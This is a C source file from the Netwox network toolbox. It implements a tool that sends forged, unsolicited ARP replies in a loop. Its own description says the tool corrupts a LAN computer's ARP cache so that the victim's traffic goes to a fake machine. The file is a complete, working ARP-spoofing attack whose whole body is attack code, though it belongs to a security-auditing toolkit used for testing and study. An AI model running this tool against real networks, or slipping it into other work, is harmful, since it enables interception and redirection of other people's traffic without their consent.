/*
                                  NETWOX
                             Network toolbox
                Copyright(c) 1999-2012 Laurent CONSTANTIN
                      http://ntwox.sourceforge.net/
                        laurentconstantin@free.fr
                                  -----

  This file is part of Netwox.

  Netwox is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License version 3
  as published by the Free Software Foundation.

  Netwox is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details (http://www.gnu.org/).

------------------------------------------------------------------------
*/

/*-------------------------------------------------------------*/
#include "../netwox.h"

/*-------------------------------------------------------------*/
netwib_conststring t000080_description[] = {
  "This tool periodically sends unsolicited ARP replies. It can be used",
  "to corrupt ARP cache of a LAN computer. Then, this computer will start",
  "sending its data to fake computer, instead of real computer.",
  NETWOX_DESC_toolpriv_spoof,
  NULL
};
netwox_toolarg t000080_args[] = {
  NETWOX_TOOLARG_REQ_ETH('e', NULL, NULL, NULL),
  NETWOX_TOOLARG_REQ_IP('i', NULL, NULL, NULL),
  NETWOX_TOOLARG_OPT_BUF_DEVICE('d', NULL, "device for spoof", NULL),
  NETWOX_TOOLARG_OPT_ETH_DST('E', "eth-dst", "to whom answer", NULL),
  NETWOX_TOOLARG_OPT_IP4_DST('I', "ip-dst", "to whom answer", NULL),
  NETWOX_TOOLARG_OPT_UINT32('s', "sleep", "sleep delay in ms", "1000"),
  NETWOX_TOOLARG_END
};
netwox_tooltreenodetype t000080_nodes[] = {
  NETWOX_TOOLTREENODETYPE_SERVER_ARP,
  NETWOX_TOOLTREENODETYPE_NETAUDIT_ARP,
  NETWOX_TOOLTREENODETYPE_END
};
netwox_tool_info t000080_info = {
  "Periodically send ARP replies",
  t000080_description,
  NULL,
  t000080_args,
  t000080_nodes,
};

/*-------------------------------------------------------------*/
netwib_err t000080_core(int argc, char *argv[])
{
  netwox_arg *parg;
  netwib_buf device, pkt;
  netwib_io *pio;
  netwib_device_dlttype dlt;
  netwib_linkhdr linkheader;
  netwib_arphdr arpheader;
  netwib_uint32 sleepms;
  netwib_bool isset;

  /* obtain parameters */
  netwib_er(netwox_arg_init(argc, argv, &t000080_info, &parg));
  netwib_er(netwox_arg_buf(parg, 'd', &device));

  netwib_er(netwib_io_init_spoof_link(&device, &pio));
  netwib_er(netwib_spoof_ctl_get_dlt(pio, &dlt));
  if (dlt != NETWIB_DEVICE_DLTTYPE_ETHER) {
    netwib_er(netwib_fmt_display("Device %{buf} does not have an Ether DLT (%{uint32}\n", &device, dlt));
    return(NETWOX_ERR_SPOOF_INVALIDDLT);
  }

  linkheader.type = NETWIB_DEVICE_DLTTYPE_ETHER;
  netwib_er(netwox_arg_eth(parg, 'e', &linkheader.hdr.ether.src));
  netwib_er(netwox_arg_isset(parg, 'E', &isset));
  if (isset) {
    netwib_er(netwox_arg_eth(parg, 'E', &linkheader.hdr.ether.dst));
  } else {
    netwib_er(netwib_eth_init_fields(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                     &linkheader.hdr.ether.dst));
  }
  linkheader.hdr.ether.type = NETWIB_ETHERHDRTYPE_ARP;
  arpheader.op = NETWIB_ARPHDROP_ARPREP;
  netwib_er(netwox_arg_eth(parg, 'e', &arpheader.ethsrc));
  netwib_er(netwox_arg_ip(parg, 'i', &arpheader.ipsrc));
  arpheader.ethdst = linkheader.hdr.ether.dst;
  netwib_er(netwox_arg_isset(parg, 'I', &isset));
  if (isset) {
    netwib_er(netwox_arg_ip(parg, 'I', &arpheader.ipdst));
  } else {
    netwib_er(netwib_ip_init_ip4(0, &arpheader.ipdst));
  }

  netwib_er(netwox_arg_uint32(parg, 's', &sleepms));

  /* construct packet */
  netwib_er(netwib_buf_init_mallocdefault(&pkt));
  netwib_er(netwib_pkt_append_linkarp(&linkheader, &arpheader, &pkt));

  /* send */
  while(NETWIB_TRUE) {
    netwib__debug_ctrlc_pressed_break();
    netwib_er(netwib_io_write(pio, &pkt));
    netwib_er(netwib_time_sleep_msec(sleepms));
  }

  /* close */
  netwib_er(netwib_buf_close(&pkt));
  netwib_er(netwib_io_close(&pio));
  netwib_er(netwox_arg_close(&parg));

  return(NETWIB_ERR_OK);
}
